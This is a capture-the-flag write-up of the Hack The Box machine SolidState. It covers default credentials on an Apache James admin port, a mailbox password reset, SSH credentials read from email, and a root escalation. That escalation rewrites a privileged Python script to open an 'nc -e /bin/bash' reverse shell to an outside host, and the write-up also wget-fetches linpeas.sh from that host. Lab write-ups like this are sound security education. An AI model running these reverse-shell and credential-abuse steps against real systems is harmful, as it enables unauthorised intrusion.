# Hack The Box - SolidState Writeup

<p align="center">
  <img src="https://img.shields.io/badge/HackTheBox-SolidState-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Medium-red?style=for-the-badge">
</p>

<p align="center">
  <b>Enumeration → Apache James → Credential Discovery → SSH → Privilege Escalation → Root</b>
</p>

---

## Machine Information

| Attribute        | Details        |
| ---------------- | -------------- |
| Platform         | Hack The Box   |
| Machine          | SolidState     |
| Difficulty       | Medium         |
| Operating System | Linux          |
| Target IP        | `10.129.77.62` |

---

# Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Port Scanning](#-port-scanning)
* [Service Enumeration](#-service-enumeration)
* [Web Enumeration](#-web-enumeration)
* [Apache James Enumeration](#-apache-james-enumeration)
* [Initial Access](#-initial-access)
* [Credential Discovery](#-credential-discovery)
* [SSH Access](#-ssh-access)
* [User Flag](#-user-flag)
* [Privilege Escalation](#-privilege-escalation)
* [Root Access](#-root-access)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# Reconnaissance

The target IP address provided by Hack The Box was:

```text
10.129.77.62
```

We begin by enumerating the exposed services.

---

# Port Scanning

A standard Nmap scan was started first while the full port scan continued in the background.

```bash
nmap 10.129.77.62
```

### Results

```text
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
```

The initial attack surface consisted of:

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 25   | SMTP    |
| 80   | HTTP    |
| 110  | POP3    |
| 119  | NNTP    |

---

# Service Enumeration

A detailed service and version detection scan was performed.

```bash
nmap -sC -sV -p22,25,80,110,119 10.129.77.62
```

### Important Results

```text
22/tcp  open  ssh
OpenSSH 7.4p1 Debian

80/tcp  open  http
Apache httpd 2.4.25 (Debian)

110/tcp open  pop3

119/tcp open  nntp
```

The HTTP service identified itself as:

```text
Apache/2.4.25 (Debian)
```

The full port scan later revealed another particularly interesting service:

```text
4555/tcp open
```

Port `4555` immediately stood out because it is commonly associated with the **Apache James Remote Administration Tool**.

---

# Host Configuration

The target was added to the local hosts file for easier enumeration.

```bash
sudo nano /etc/hosts
```

Entry:

```text
10.129.77.62 solidstate.htb
```

This allowed the application to be accessed using:

```text
http://solidstate.htb
```

---

# Web Enumeration

The HTTP service was explored using Burp Suite and directory enumeration tools.

Feroxbuster was used to discover additional directories.

```bash
feroxbuster -u http://solidstate.htb
```

The enumeration revealed directories such as:

```text
/images
/assets
```

These did not immediately provide a direct path to exploitation.

At this point, the unusual port `4555` became the primary focus.

---

# Apache James Enumeration

Port `4555` is commonly used by the Apache James Remote Administration service.

The service was identified as:

```text
JAMES Remote Administration Tool 2.3.2
```

We connected using Telnet:

```bash
telnet 10.129.77.62 4555
```

The service responded with:

```text
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
Password:
```

---

# Default Credentials

Apache James installations may use default administrative credentials.

The credentials tested against the remote administration interface were:

```text
Username: root
Password: root
```

Authentication was successful.

This provided access to the Apache James administrative interface.

---

# User Enumeration

Once authenticated, the available mail accounts could be enumerated using:

```text
listusers
```

The server returned:

```text
Existing accounts 5

user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

The account `mindy` immediately became interesting because it was an actual local user account that could potentially provide access to the underlying system.

---

# Apache James Exploitation

Apache James Server `2.3.2` is associated with a known remote code execution vulnerability.

A publicly available exploit was used as a reference:

```text
Exploit-DB: 50347
```

The exploit was adapted for the target environment.

One of the interesting capabilities involved manipulating user account information through the James administration service.

A specially crafted account was created during exploitation.

Afterward, the user list contained:

```text
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

The vulnerability could then be leveraged to interact with the target filesystem and ultimately modify the password associated with the `mindy` account.

---

# Password Reset

The Apache James administrative interface provides a command for changing user passwords:

```text
setpassword mindy password
```

The server responded:

```text
Password for mindy reset
```

This meant that we could now authenticate to the mail service as `mindy`.

---

# Mail Enumeration

The POP3 service was available on port `110`.

We connected using Telnet:

```bash
telnet 10.129.77.62 110
```

Authentication was performed using the newly reset credentials.

```text
USER mindy
PASS password
```

The server accepted the credentials:

```text
+OK Welcome mindy
```

We then listed the available messages:

```text
LIST
```

Output:

```text
+OK 2 1945
1 1109
2 836
.
```

Two messages were present.

The second message was retrieved:

```text
RETR 2
```

---

# Credential Discovery

The email contained an important message from the mail administrator.

The message indicated that SSH credentials had been provided to `mindy`.

The discovered credentials were:

```text
Username: mindy
Password: P@55W0rd1!2@
```

The message also noted that access was restricted and that the password should be changed after the initial login.

This provided a direct path to SSH access.

---

# SSH Access

The credentials were tested against the SSH service.

```bash
ssh mindy@10.129.77.62
```

After authentication, access was obtained as:

```text
mindy
```

The user home directory contained:

```text
bin
user.txt
```

Checking the current identity:

```bash
whoami
```

Output:

```text
mindy
```

Initial user-level access had been established.

---

# Shell Stabilization

A reverse shell was also obtained during the exploitation process.

A Netcat listener was started:

```bash
nc -lvnp 4444
```

The connection was received from the target.

The shell was initially limited, so Python was used to spawn a proper pseudo-terminal.

First:

```bash
which python3
```

Output:

```text
/usr/bin/python3
```

Then:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The shell was backgrounded and the local terminal was adjusted:

```bash
stty raw -echo
fg
```

The shell was now much easier to use for further enumeration.

---

# User Flag

The user flag was located in the `mindy` home directory.

```bash
ls
```

Output:

```text
bin
user.txt
```

The flag was read using:

```bash
cat user.txt
```

User-level access was successfully confirmed.

---

# Privilege Escalation

With access as `mindy`, the next step was local privilege escalation enumeration.

A Linux enumeration script was transferred to the target.

```bash
wget http://10.10.15.95:8/linpeas.sh
```

After transferring the script, it was executed to identify possible privilege escalation vectors.

Several potential vulnerabilities were reported, including:

```text
CVE-2017-16995
CVE-2021-4034
CVE-2021-22555
CVE-2017-6074
```

The system also contained a SUID-enabled `pkexec` binary:

```text
/usr/bin/pkexec
```

However, another particularly interesting finding appeared during manual enumeration.

---

# 🔎 Interesting `/opt` Directory

The `/opt` directory contained:

```text
james-2.3.2
tmp.py
```

The file `tmp.py` was inspected:

```bash
cat /opt/tmp.py
```

Original contents:

```python
#!/usr/bin/env python

import os
import sys

try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

The script was particularly interesting because it executed an operating system command using:

```python
os.system()
```

If this script was executed with elevated privileges and could be modified by the current user, it could provide a straightforward privilege escalation path.

---

# 💥 Privilege Escalation Through `tmp.py`

The existing command was replaced with a reverse shell command:

```python
#!/usr/bin/env python

import os
import sys

try:
     os.system('nc 10.10.15.95 5555 -e /bin/bash ')
except:
     sys.exit()
```

A listener was started on the attacking machine:

```bash
nc -lvnp 5555
```

Once the modified script was executed by the privileged process, a connection was received.

---

# 👑 Root Access

The listener received a connection from the target:

```text
Connection received on 10.129.77.62
```

Checking the current privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The privilege escalation was successful.

We now had:

```text
root
```

access to the machine.

The root flag could then be retrieved:

```bash
cat /root/root.txt
```

---

# 🗺️ Attack Path Summary

```text
┌──────────────────────────────┐
│          Nmap Scan            │
│                              │
│ SSH / SMTP / HTTP / POP3     │
│        / NNTP / 4555         │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│    Apache James 2.3.2        │
│        Port 4555             │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Default Credentials     │
│          root:root           │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       User Enumeration       │
│                              │
│ james / thomas / john        │
│ mindy / mailadmin            │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│   Apache James Exploitation  │
│                              │
│   Password Reset for Mindy   │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       POP3 Enumeration       │
│                              │
│     Read Mindy's Mail        │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       SSH Credentials        │
│                              │
│         mindy / ...          │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│        SSH Access            │
│                              │
│          mindy               │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Local Enumeration      │
│                              │
│       /opt/tmp.py            │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Privileged Script      │
│                              │
│      os.system() Abuse       │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│            ROOT              │
│                              │
│       Full System Access     │
└──────────────────────────────┘
```

---

# 🔗 Complete Attack Chain

```text
Nmap Enumeration
       │
       ▼
Apache James 2.3.2
       │
       ▼
Remote Administration
       │
       ▼
Default Credentials
       │
       ▼
James Exploitation
       │
       ▼
Mindy Password Reset
       │
       ▼
POP3 Mail Access
       │
       ▼
SSH Credentials
       │
       ▼
SSH as mindy
       │
       ▼
Local Enumeration
       │
       ▼
/opt/tmp.py
       │
       ▼
Privileged Script Execution
       │
       ▼
Command Execution
       │
       ▼
ROOT
```

---

# 🧠 Key Takeaways

## 🔹 Enumerate Unusual Ports

Port `4555` was one of the most important findings.

It is not part of the standard top-1000 ports most people initially focus on, but a full port scan revealed it.

The service was identified as:

```text
Apache James Remote Administration
```

This demonstrates why full port scans are important during penetration testing.

---

## 🔹 Default Credentials Should Always Be Tested

The Apache James administration interface accepted the default administrative credentials:

```text
root:root
```

Default credentials are one of the simplest but most dangerous forms of misconfiguration.

They should always be changed before deploying a service.

---

## 🔹 Mail Servers Can Contain Credentials

After gaining access to the James administration interface, the `mindy` account could be accessed.

The POP3 mailbox contained SSH credentials.

This demonstrates why email infrastructure should be treated as a highly sensitive attack surface.

Compromising a mailbox can expose:

* Passwords
* SSH credentials
* Internal information
* Password reset links
* Administrative communications

---

## 🔹 Always Enumerate Local Files After Initial Access

After obtaining access as `mindy`, several possible vulnerabilities were identified using automated enumeration.

However, manual inspection of `/opt` revealed:

```text
/opt/tmp.py
```

This ultimately provided the relevant privilege escalation path.

Automated tools are useful, but they should supplement rather than replace manual enumeration.

---

## 🔹 Dangerous Privileged Scripts

The `tmp.py` script used:

```python
os.system()
```

to execute a shell command.

If a user can modify a script that is executed with elevated privileges, the result can be complete system compromise.

Privileged scripts should:

* Be owned by trusted administrators
* Not be writable by unprivileged users
* Avoid unnecessary shell execution
* Validate all external input
* Use safer APIs where possible

---

# 🛠️ Tools Used

```text
Nmap
Feroxbuster
Burp Suite
Telnet
Apache James
Netcat
SSH
LinPEAS
Python
Linux Enumeration Commands
```

---

# 📚 Vulnerabilities and Misconfigurations

| Finding                         | Component            | Impact                |
| ------------------------------- | -------------------- | --------------------- |
| Default Credentials             | Apache James         | Administrative Access |
| Vulnerable Apache James Version | James 2.3.2          | Remote Exploitation   |
| Password Reset                  | James Administration | Account Takeover      |
| Sensitive Email Content         | POP3                 | Credential Disclosure |
| Weak Privileged Script          | `/opt/tmp.py`        | Command Execution     |
| Unsafe `os.system()` Usage      | Python               | Privilege Escalation  |

---

# 🎯 Lessons Learned

SolidState demonstrates how an attack can progress through several different services before reaching the operating system.

```text
Unusual Port Discovery
        +
Default Credentials
        +
Mail Server Exploitation
        +
Credential Disclosure
        +
SSH Access
        +
Privileged Script Abuse
        =
Complete System Compromise
```

The machine reinforces several important penetration testing principles:

1. Perform full port enumeration.
2. Investigate unusual ports and services.
3. Test default credentials where appropriate.
4. Enumerate users after gaining administrative access.
5. Inspect mailboxes for sensitive information.
6. Treat credentials discovered during enumeration as potential pivots.
7. Perform thorough local enumeration after obtaining shell access.
8. Do not rely exclusively on automated enumeration tools.
9. Inspect custom scripts executed with elevated privileges.
10. Check whether privileged scripts are writable by lower-privileged users.

---

# 🏁 Final Notes

Hack The Box **SolidState** is a strong example of chained exploitation.

The initial foothold does not come directly from SSH. Instead, the attack begins with an exposed administrative service and eventually moves through the mail infrastructure before reaching the operating system.

The complete path was:

```text
Port Enumeration
      ↓
Apache James Discovery
      ↓
Default Credentials
      ↓
James Exploitation
      ↓
Mindy Account
      ↓
POP3 Mailbox
      ↓
SSH Credentials
      ↓
Mindy SSH Access
      ↓
Local Enumeration
      ↓
Privileged Script
      ↓
Command Execution
      ↓
ROOT
```

The key lesson from SolidState is:

> **Never treat individual services as isolated components. Understanding how authentication, mail, web services, and local processes interact can reveal an attack chain that would otherwise be easy to miss.**

---

## ⚠️ Disclaimer

This writeup is created strictly for educational purposes and documents techniques performed against the intentionally vulnerable **Hack The Box SolidState** machine in an authorized laboratory environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Hack The Box - SolidState</b><br>
  Linux | Medium | Apache James | Credential Discovery | SSH | Privilege Escalation
</p>
